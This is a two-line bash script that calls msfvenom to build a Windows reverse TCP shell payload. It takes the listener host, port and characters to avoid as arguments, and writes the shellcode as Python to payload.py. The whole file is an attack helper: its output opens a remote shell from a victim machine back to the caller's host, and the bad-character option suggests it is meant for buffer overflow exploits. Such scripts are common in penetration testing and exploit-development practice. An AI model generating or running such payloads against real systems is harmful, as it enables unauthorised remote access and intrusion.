#!/bin/bash
 msfvenom -p windows/shell_reverse_tcp LHOST=$1 LPORT=$2 EXITFUNC=thread -b $3 -f py > payload.py
 